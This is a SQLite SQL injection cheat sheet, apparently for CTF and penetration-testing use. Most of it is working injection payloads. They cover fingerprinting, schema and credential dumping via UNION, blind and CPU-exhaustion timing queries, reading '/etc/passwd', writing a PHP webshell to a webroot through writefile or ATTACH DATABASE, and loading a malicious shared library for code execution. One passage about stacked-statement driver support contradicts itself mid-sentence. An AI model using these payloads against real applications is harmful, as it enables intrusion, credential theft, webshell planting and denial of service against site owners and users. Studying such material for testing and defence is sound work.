# SQLite — full exploitation reference

SQLite powers mobile apps, desktop apps, Flask/Django dev setups,
and most "embedded db" CTF challenges. Differences that matter:
dynamic typing (no real types), no stacked queries through most
drivers, no sleep function, no file I/O functions by default —
but `ATTACH` and `load_extension` open write/RCE paths.

---

## 1. Fingerprint

```sql
' UNION SELECT sqlite_version(),NULL-- -          -- '3.37.2'
' UNION SELECT NULL,sqlite_version(),NULL-- -
' UNION SELECT NULL,sqlite_source_id(),NULL-- -   -- commit hash+date
' UNION SELECT NULL,sqlite_compileoption_used('ENABLE_FTS5'),NULL-- -
```

SQLite-only tells: `sqlite_master`/`sqlite_temp_master`,
`sqlite_version()`, `last_insert_rowid()`, `random()`,
`randomblob()`, `hex()`, `like()`, `glob()`, `unicode()`,
`char()`, `||` concat, `X''` blob literals, `''` to quote, `--` and
`/* */` comments. No `FROM` needed for scalar selects (like MySQL,
UNLIKE Oracle).

Discriminator vs MySQL:

```sql
' AND 'a'||'b'='ab'-- -              -- true on SQLite (MySQL: 0/err)
' AND randomblob(4)>''-- -           -- works only on SQLite
```

---

## 2. Catalog — `sqlite_master` is the whole schema

```sql
-- every object
SELECT type,name,tbl_name,sql FROM sqlite_master;
'~'||group_concat(name)||'~' FROM sqlite_master WHERE type='table'
'~'||group_concat(name)||'~' FROM sqlite_master WHERE type='index'
'~'||group_concat(name)||'~' FROM sqlite_master WHERE type='trigger'
'~'||group_concat(name)||'~' FROM sqlite_master WHERE type='view'

-- the CREATE statement itself = full column list + types
'~'||sql||'~' FROM sqlite_master WHERE name='users'
-- always fetch `sql` — it carries the complete definition,
-- better than information_schema anywhere else

-- column list via pragma (table-valued pragma, 3.16+)
SELECT name,type FROM pragma_table_info('users');
'~'||group_concat(name)||'~' FROM pragma_table_info('users')

-- hidden/internal objects
SELECT name FROM sqlite_master WHERE name LIKE 'sqlite_%';
SELECT name FROM sqlite_temp_master;
```

`sqlite_master.sql` is the single most valuable field in SQLite
injection — one row gives you the full `CREATE TABLE` text.

---

## 3. UNION extraction

```sql
' UNION SELECT NULL,sqlite_version(),NULL-- -
' UNION SELECT NULL,group_concat(name),NULL
   FROM sqlite_master WHERE type='table'-- -
' UNION SELECT NULL,sql,NULL FROM sqlite_master
   WHERE name='users'-- -
' UNION SELECT NULL,username||':'||password,NULL FROM users-- -
' UNION SELECT NULL,group_concat(username||':'||password,'
'),NULL FROM users-- -
```

Concat: `||` only (no `concat()`). `group_concat(x,sep)` — second
arg IS the separator (default `,`). `char(10)` for newline sep.
No `substring` — use `substr(x,a,b)`. `instr()` for position,
`replace()` for transforms. `quote(x)` renders a value with its
SQL literal form — `quote(password)` shows `'abc'` quoted, handy
for binary/blob: `quote(col)` renders `X'4142'` for blobs,
`hex(col)` for raw hex.

Type looseness that helps:

- `'a'+1` = 1 (numeric coercion), `'a'||1` = 'a1'.
- `CAST(x AS TEXT)`/CAST(x AS INTEGER) work; real/int/text/blob/
  numeric "afffinities" only.
- `UNION` between int col and text col never errors — the flex
  makes UNION extraction painless.

---

## 4. Blind recipes

```sql
-- boolean
' AND LENGTH((SELECT name FROM sqlite_master LIMIT 1))>3-- -
' AND unicode(substr((SELECT name FROM sqlite_master LIMIT 1),
   1,1))>97-- -                                        -- unicode() not ascii
' AND hex(substr((SELECT flag FROM secrets LIMIT 1),1,1))>'5'-- -
' AND (SELECT COUNT(*) FROM users)>5-- -

-- time — no sleep function; heavy-query torture:
' AND (SELECT COUNT(*) FROM sqlite_master a,sqlite_master b,
   sqlite_master c,sqlite_master d)>0-- -               -- cartesian CPU
' AND randomblob(200000000)>0-- -                        -- 200MB alloc
' AND like('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
   upper(hex(randomblob(500000000/2))))-- -              -- classic LIKE-torture
' AND (SELECT 1 WHERE 1=1 AND
   like('AAAAAAAAAAAAAA',upper(hex(randomblob(1e8)))))-- -

-- regex ext exists on some builds:
' AND (SELECT 'a' REGEXP '^a')=1-- -                  -- only if ext loaded
```

The `LIKE 'AAA...'` + `upper(hex(randomblob(N)))` combo is THE
SQLite sleep substitute — the pattern match over a giant string
takes seconds.

---

## 5. Error channel — weak but present

```sql
' AND load_extension('nonexistent')-- -      -- 'not authorized' =
                                            --  sqlite confirmed
' AND (SELECT abs(randomblob(9)))=1-- -      -- sometimes echoes
' AND CAST('x' AS int)=1-- -                 -- SQLite is forgiving:
   -- 'x' casts to 0, no error — don't rely on cast errors here!
' AND tointeger('x')-- -                     -- unknown fn error names
                                            -- the driver
```

SQLite rarely echoes data in errors — treat it as blind-first.

---

## 6. File read — nothing built in

No `LOAD_FILE`, no `pg_read_file`, no `OPENROWSET`. What exists:

- `readfile()`/`writefile()` — **SQLite CLI extension functions**,
  present when the app embeds the CLI shell or loads them — rare
  but worth probing:

  ```sql
  ' UNION SELECT readfile('/etc/passwd'),NULL-- -
  ' UNION SELECT CAST(readfile('/flag') AS text),NULL-- -
  ' UNION SELECT NULL,writefile('/tmp/x',hexblob('41')),NULL-- -
  ' UNION SELECT NULL,writefile('/var/www/html/s.php',
     '<?php system($_GET[c]); ?>'),NULL-- -
  ```

- `edit()`,`edit3()` — same family; probe existence via
  `pragma_function_list`:

  ```sql
  ' UNION SELECT name,NULL FROM pragma_function_list
     WHERE name IN ('readfile','writefile','edit','load_extension')-- -
  ' UNION SELECT name,narg FROM pragma_function_list
     WHERE name LIKE '%file%'-- -
  ```

`pragma_function_list` enumerates ALL linked functions — run it
early; a custom `file_read()`/`exec()` extension changes the game.

---

## 7. ATTACH — file creation primitive (CTF favourite)

`ATTACH DATABASE 'path' AS name` creates a NEW sqlite db file
anywhere the process can write — and you can put a table with
arbitrary content in it. Stacked statements or app-level support:

```sql
'; ATTACH DATABASE '/var/www/html/x.php' AS x;
   CREATE TABLE x.t(a text);
   INSERT INTO x.t VALUES('<?php system($_GET[c]); ?>');-- -
```

If the injected value lands inside an `ATTACH` path or a `CREATE
TABLE`, simpler still — you control the file path AND content
(almost). Write target = webroot → PHP/ASP shell. This is the
canonical "sqlite to webshell" trick in CTF.

Constraints:

- `ATTACH`/`DETACH`/`CREATE`/`INSERT` need stacked statements —
  most app drivers (python sqlite3, node better-sqlite3, PDO)
  DO allow `;` in execute() one statement per call... actually
  python's `execute()` rejects multi-statement strings; `executescript`
  doesn't. PHP `SQLite3::query` allows ONE statement — probe.
- The file is a valid sqlite db — the written page will carry a
  sqlite header before your payload text. PHP still executes the
  `<?php` block fine (header is binary noise before the tag).
- `sqlite3` CLI `open` reads any db file — verify locally.

---

## 8. load_extension — RCE primitive

```sql
' AND load_extension('/tmp/evil.so')-- -
' UNION SELECT load_extension('C:\evil.dll'),NULL-- -
' UNION SELECT load_extension('evil'),NULL-- -     -- .so/.dll auto
```

Disabled by default in most bindings (PHP, Python). Errors:
`not authorized` — present but off; `no such function` — stripped.

If `load_extension` works: compile a `.so` exporting
`sqlite3_extension_init` that runs your command — local-toolchain
job; or hunt for a writable extension on disk (`/usr/lib/sqlite3/
pcre.so` style common prebuilt ext).

---

## 9. JSON / FTS / RTREE extensions

```sql
-- JSON1 (built-in ≥3.38):
' UNION SELECT json_extract(data,'$.key'),NULL FROM docs-- -
' UNION SELECT data->>'secret',NULL FROM docs-- -          -- ->> op
' UNION SELECT json_group_array(username) FROM users-- -   -- dump agg

-- FTS5 content (the search index often mirrors secrets):
' UNION SELECT * FROM fts_table-- -
SELECT name FROM sqlite_master WHERE sql LIKE '%fts5%';

-- RTREE / GEOPOLY shapes — probe existence:
SELECT name FROM sqlite_master WHERE sql LIKE '%rtree%';
```

`json_each`/`json_tree` are table-valued — explode nested JSON
inside blind extraction via `key`,`value` cols.

---

## 10. Quirks

- `||` concat, no `concat()`.
- `substr` not `substring`; `unicode()` not `ascii()`.
- `length(x)` on blobs = byte count.
- `glob` = case-SENSITIVE like; `like` case-insensitive (ASCII).
- `instr(haystack,needle)` — position probe:
  `AND instr((SELECT flag FROM x),'{')=5-- -`
- `replace(x,'a','b')` — charset mapping tricks.
- `printf('%c',65)` — char-by-code without char().
- `hex()`/`unhex()` — hex literally everywhere (blob handling).
- `zeroblob(n)`/`randomblob(n)` — payload padding and CPU tricks.
- `trim`/`ltrim`/`rtrim` — squeeze prefixes off extracted values.
- No INFORMATION_SCHEMA — `sqlite_master` + `pragma_*` only.
- `PRAGMA database_list` — list attached DBs:
  `SELECT * FROM pragma_database_list` (via UNION).
- `PRAGMA compile_options` — `pragma_compile_options` lists build
  features (FTS5? JSONB? RTREE? SECURE_DELETE?).
- `sqlite_stat*`/`sqlite_sequence` leak row counts without perms.
- AUTOINCREMENT counter lives in `sqlite_sequence` — `SELECT
  seq FROM sqlite_sequence WHERE name='users'` = last rowid —
  free "how many rows" without reading the table.

---

## 11. Second-order / write primitives

- Any UPDATE/INSERT you reach writes the db file directly —
  persistence is trivial (no service restart needed).
- `sqlite_sequence` manual bump → id prediction/idor pivot.
- Triggers stored in `sqlite_master` — a trigger on a table you
  control = stored code that fires on any writer (privesc inside
  the app).

---

## 12. Quick diagnosis table

| Need | Statement |
|---|---|
| version | `sqlite_version()` |
| list tables | `sqlite_master WHERE type='table'` |
| table def | `sqlite_master.sql` (full CREATE) |
| columns | `pragma_table_info('t')` |
| read file | `readfile()` IF ext linked — probe `pragma_function_list` |
| write file | `ATTACH DATABASE 'path' AS x` + `CREATE TABLE`+`INSERT` |
| RCE | `load_extension('path.so')` (usually off) |
| sleep | `LIKE torture`/`randomblob(N)` cartesian — no sleep fn |
| error echo | almost none — blind-first DBMS |
| OOB | none — dead end, route elsewhere |
| rows as JSON | `json_group_array`/`json_object` (if JSON1) |
| privilege | everything runs as the embedding process |
